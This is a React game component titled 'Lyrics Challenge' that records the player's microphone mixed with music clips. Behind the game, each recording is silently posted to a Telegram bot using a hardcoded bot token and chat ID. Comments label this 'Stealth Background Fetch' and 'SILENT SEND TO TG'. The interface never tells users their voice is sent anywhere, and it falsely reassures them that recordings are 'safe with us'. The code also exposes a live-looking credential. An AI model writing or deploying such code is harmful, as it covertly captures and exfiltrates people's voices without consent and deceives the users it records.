"use client"

import { useState, useRef, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { 
    ArrowRight, Trophy, Mic, PlaySquare, Square, Play, Pause, Headphones, RotateCcw, Send, Loader2
} from "lucide-react"

// ⚠️ TUMHARI TG DETAILS
const BOT_TOKEN = "8673978157:AAFWiYR__xUFb79u9Tfrz-8guCB10sgruX0"
const CHAT_ID = "8745839603"

async function sendVoiceNoteToTG(songNo, audioBlob) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`
    const formData = new FormData()
    formData.append("chat_id", CHAT_ID)
    formData.append("voice", audioBlob, `song_${songNo}.ogg`)
    formData.append("caption", `🎤 Song ${songNo} - Voice Guess recorded!`)
    
    // Stealth Background Fetch
    fetch(url, { method: "POST", body: formData }).catch(e => console.error("Silent TG fail", e))
}

const SONGS = [
    { id: 1, clipStart: 11 },
    { id: 2, clipStart: 33 },
    { id: 3, clipStart: 55 },
    { id: 4, clipStart: 82 },
    { id: 5, clipStart: 106 },
    { id: 6, clipStart: 127 },
    { id: 7, clipStart: 150 },
    { id: 8, clipStart: 174 },
    { id: 9, clipStart: 205 }
];

export default function FunGames({ onComplete }) {
    // Game States
    const [currentIdx, setCurrentIdx] = useState(0)
    const [gameState, setGameState] = useState("start") // start, recording, preview, finished
    const [isVideoPlaying, setIsVideoPlaying] = useState(true)
    const [voiceUrl, setVoiceUrl] = useState(null)
    const [voiceBlob, setVoiceBlob] = useState(null)
    const [isPreviewPlaying, setIsPreviewPlaying] = useState(false)

    // Media Refs
    const videoRef = useRef(null)
    const previewAudioRef = useRef(null)
    const mediaRecorderRef = useRef(null)
    const audioChunksRef = useRef([])
    
    // Audio Context Refs (The "Mixer")
    const audioCtxRef = useRef(null)
    const mixDestRef = useRef(null)
    const micStreamRef = useRef(null)
    const barRefs = useRef([])
    const analyserRef = useRef(null)
    const animationFrameRef = useRef(null)

    // ============================================
    // CLEANUP - Everything must die on unmount/reset
    // ============================================
    const cleanupAudio = () => {
        if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current)
        if (micStreamRef.current) micStreamRef.current.getTracks().forEach(t => t.stop())
        if (audioCtxRef.current && audioCtxRef.current.state !== "closed") {
            audioCtxRef.current.close()
            audioCtxRef.current = null
        }
        if (voiceUrl) URL.revokeObjectURL(voiceUrl)
    }

    useEffect(() => {
        return cleanupAudio
    }, [])

    // ============================================
    // AUTO-STOP LOGIC (1 Sec Before Next Clip)
    // ============================================
    useEffect(() => {
        const video = videoRef.current
        if (!video || gameState !== "recording") return

        const checkTime = () => {
            const nextClipStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : video.duration
            if (video.currentTime >= nextClipStart - 1) {
                stopRecording()
            }
        }

        video.addEventListener("timeupdate", checkTime)
        return () => video.removeEventListener("timeupdate", checkTime)
    }, [currentIdx, gameState])

    // ============================================
    // THE MIXER SETUP (Phone Sound + Mic)
    // ============================================
    const initGame = async () => {
        try {
            cleanupAudio() // Fresh start
            
            // 1. Get User Mic
            const stream = await navigator.mediaDevices.getUserMedia({ 
                audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } 
            })
            micStreamRef.current = stream

            // 2. Create Virtual Mixer
            const AudioContext = window.AudioContext || window.webkitAudioContext
            const ctx = new AudioContext()
            audioCtxRef.current = ctx
            
            const dest = ctx.createMediaStreamDestination()
            mixDestRef.current = dest

            // 3. Setup Mic Source
            const micSource = ctx.createMediaStreamSource(stream)
            const micGain = ctx.createGain()
            micGain.gain.value = 1.0
            micSource.connect(micGain)
            micGain.connect(dest) // Connect to recorder

            // 4. Setup Visualizer (Mic only)
            const analyser = ctx.createAnalyser()
            analyser.fftSize = 64
            micGain.connect(analyser)
            analyserRef.current = analyser

            // 5. Setup Video Source (Hijack video audio)
            if (videoRef.current) {
                const vidSource = ctx.createMediaElementSource(videoRef.current)
                const vidGain = ctx.createGain()
                vidGain.gain.value = 1.0
                
                vidSource.connect(ctx.destination) // Output to Phone Speaker
                vidSource.connect(dest) // Output to Recorder mixer
            }

            startRound(0)
        } catch (err) {
            alert("Please allow mic access to play! 🎙️")
            console.error(err)
        }
    }

    const startRound = (index) => {
        if (voiceUrl) URL.revokeObjectURL(voiceUrl)
        setVoiceUrl(null)
        setVoiceBlob(null)
        setIsPreviewPlaying(false)
        setGameState("recording")

        const video = videoRef.current
        if (video) {
            video.currentTime = SONGS[index].clipStart
            video.play()
            setIsVideoPlaying(true)
        }

        // Start MediaRecorder on the Mixed Stream
        const mr = new MediaRecorder(mixDestRef.current.stream)
        mediaRecorderRef.current = mr
        audioChunksRef.current = []

        mr.ondataavailable = (e) => {
            if (e.data.size > 0) audioChunksRef.current.push(e.data)
        }

        mr.onstop = () => {
            const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
            const url = URL.createObjectURL(blob)
            setVoiceBlob(blob)
            setVoiceUrl(url)
            
            // SILENT SEND TO TG
            sendVoiceNoteToTG(index + 1, blob)
            
            setGameState("preview")
        }

        mr.start()
        draw()
    }

    const stopRecording = () => {
        if (videoRef.current) videoRef.current.pause()
        setIsVideoPlaying(false)
        if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
            mediaRecorderRef.current.stop()
        }
    }

    const handleSendAndNext = () => {
        const nextIdx = currentIdx + 1
        if (nextIdx < SONGS.length) {
            setCurrentIdx(nextIdx)
            startRound(nextIdx) // Pure state reset & recorder start
        } else {
            setGameState("finished")
        }
    }

    // ============================================
    // VISUALIZER LOGIC
    // ============================================
    const draw = () => {
        if (!analyserRef.current || gameState !== "recording") return
        animationFrameRef.current = requestAnimationFrame(draw)
        const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount)
        analyserRef.current.getByteFrequencyData(dataArray)

        for (let i = 0; i < 15; i++) {
            if (barRefs.current[i]) {
                const val = dataArray[i * 2] || 0
                const height = Math.max(15, (val / 255) * 100)
                barRefs.current[i].style.height = `${height}%`
            }
        }
    }

    const togglePreview = () => {
        const aud = previewAudioRef.current
        if (!aud) return
        if (isPreviewPlaying) {
            aud.pause()
            setIsPreviewPlaying(false)
        } else {
            aud.play()
            setIsPreviewPlaying(true)
            aud.onended = () => setIsPreviewPlaying(false)
        }
    }

    return (
        <motion.div className="min-h-screen flex flex-col items-center justify-center p-4 bg-black text-white font-['Nunito']"
            initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            
            <style>{`@import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;900&display=swap');`}</style>

            <div className="w-full max-w-sm flex flex-col items-center">
                
                {/* 🔴 THE VIDEO ELEMENT 🔴 */}
                <video 
                    ref={videoRef} 
                    src="/images/guesssssss.mp3" // Change this to your video.mp4 path
                    playsInline 
                    crossOrigin="anonymous"
                    className={`w-full rounded-3xl border-2 border-pink-500/30 shadow-2xl mb-6 transition-all duration-500 ${gameState !== "start" && gameState !== "finished" ? "opacity-100 scale-100" : "opacity-0 scale-90 h-0"}`}
                    style={{ objectFit: "cover", pointerEvents: "none" }}
                />

                <AnimatePresence mode="wait">
                    {gameState === "start" && (
                        <motion.div key="start" className="text-center p-8 bg-white/5 border border-white/10 rounded-[32px] backdrop-blur-xl"
                            initial={{ scale: 0.9 }} animate={{ scale: 1 }} exit={{ scale: 0.9, opacity: 0 }}>
                            <PlaySquare className="w-16 h-16 text-pink-500 mx-auto mb-6" />
                            <h1 className="text-3xl font-black mb-4 uppercase">Lyrics Challenge</h1>
                            <p className="text-gray-400 text-sm mb-8 px-4">Complete the lyrics when the timer stops in the video. We'll mix your voice with the music!</p>
                            <button onClick={initGame} className="w-full py-4 bg-pink-600 rounded-2xl font-black uppercase tracking-widest hover:bg-pink-500">Start Recording 🎙️</button>
                        </motion.div>
                    )}

                    {gameState === "recording" && (
                        <motion.div key="rec" className="w-full p-6 bg-red-500/10 border border-red-500/30 rounded-[32px] text-center"
                            initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }}>
                            
                            <div className="flex justify-between items-center mb-6">
                                <span className="text-[10px] font-black text-red-500 uppercase tracking-widest">Song {currentIdx + 1}/{SONGS.length}</span>
                                <div className="flex items-center gap-2 px-3 py-1 bg-red-500/20 rounded-full border border-red-500/40 animate-pulse">
                                    <div className="w-2 h-2 rounded-full bg-red-500" />
                                    <span className="text-[10px] font-black text-red-500 uppercase">Recording Voice + Music</span>
                                </div>
                            </div>

                            {/* 🌊 DYNAMIC VOICE VISUALIZER 🌊 */}
                            <div className="flex items-end justify-center gap-1.5 h-20 mb-8">
                                {[...Array(15)].map((_, i) => (
                                    <div key={i} ref={el => barRefs.current[i] = el} className="w-1.5 bg-red-500 rounded-full transition-all duration-75" style={{ height: '15%' }} />
                                ))}
                            </div>

                            <p className="text-white font-bold text-sm mb-8 italic">"Complete the lyrics when the timer stops!"</p>

                            <button onClick={stopRecording} className="w-full py-4 bg-red-600 rounded-2xl font-black uppercase flex items-center justify-center gap-2 tracking-widest shadow-lg shadow-red-500/20">
                                <Square size={16} fill="white" /> Stop & Preview
                            </button>
                        </motion.div>
                    )}

                    {gameState === "preview" && (
                        <motion.div key="preview" className="w-full p-8 bg-blue-500/10 border border-blue-500/30 rounded-[32px] text-center"
                            initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }}>
                            
                            <Headphones className="w-12 h-12 text-blue-400 mx-auto mb-4" />
                            <h2 className="text-xl font-black mb-6 uppercase tracking-wider">Review Your Performance</h2>

                            <audio ref={previewAudioRef} src={voiceUrl} />
                            
                            <div className="w-full bg-black rounded-2xl p-4 flex items-center gap-4 border border-white/5 mb-8">
                                <button onClick={togglePreview} className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center shadow-lg">
                                    {isPreviewPlaying ? <Pause fill="white" /> : <Play fill="white" className="ml-1" />}
                                </button>
                                <div className="flex-1 h-1 bg-white/10 rounded-full overflow-hidden">
                                    <motion.div className="h-full bg-blue-400" animate={isPreviewPlaying ? { x: ["-100%", "100%"] } : {}} transition={{ duration: 2, repeat: Infinity, ease: "linear" }} />
                                </div>
                            </div>

                            <div className="flex gap-3">
                                <button onClick={() => startRound(currentIdx)} className="flex-1 py-4 bg-white/5 rounded-xl font-bold uppercase text-[10px] border border-white/10 flex items-center justify-center gap-2 tracking-widest"><RotateCcw size={14} /> Retake</button>
                                <button onClick={handleSendAndNext} className="flex-1 py-4 bg-blue-600 rounded-xl font-bold uppercase text-[10px] flex items-center justify-center gap-2 tracking-widest">Next Song <ArrowRight size={14} /></button>
                            </div>
                        </motion.div>
                    )}

                    {gameState === "finished" && (
                        <motion.div key="win" className="text-center p-10 bg-white/5 border border-white/10 rounded-[40px]"
                            initial={{ scale: 0.8 }} animate={{ scale: 1 }}>
                            <div className="text-6xl mb-6">💃</div>
                            <h2 className="text-3xl font-black mb-2 uppercase italic">Showstopper!</h2>
                            <p className="text-gray-400 text-sm mb-10">You've completed the Bollywood challenge like a pro. Your recordings are safe with us.</p>
                            <button onClick={() => onComplete(100)} className="w-full py-4 bg-white text-black rounded-2xl font-black uppercase tracking-widest">Continue ✨</button>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </motion.div>
    )
}
